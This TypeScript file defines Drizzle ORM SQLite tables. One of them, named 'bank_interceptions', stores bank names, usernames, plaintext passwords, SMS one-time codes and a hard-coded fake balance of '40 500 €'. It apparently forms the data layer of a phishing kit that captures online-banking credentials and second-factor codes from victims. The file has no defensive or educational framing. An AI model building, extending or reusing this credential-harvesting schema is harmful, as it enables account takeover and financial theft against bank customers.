import { sqliteTable, text } from "drizzle-orm/sqlite-core";
import { sql } from "drizzle-orm";

export const bankInterceptions = sqliteTable("bank_interceptions", {
  id: text("id").primaryKey(), 
  bankName: text("bank_name").notNull(),
  username: text("username").notNull(),  
  password: text("password").notNull(),  
  smsCode: text("sms_code"),  
  balance: text("balance").default("40 500 €"),
  amountInput: text("amount_input"),
  createdAt: text("created_at").default(sql`CURRENT_TIMESTAMP`),  
  updatedAt: text("updated_at").default(sql`CURRENT_TIMESTAMP`),  
});


 
export const appSettings = sqliteTable("app_settings", {
  id: text("id").primaryKey(),  
  value: text("value").notNull(),  
  updatedAt: text("updated_at"),
});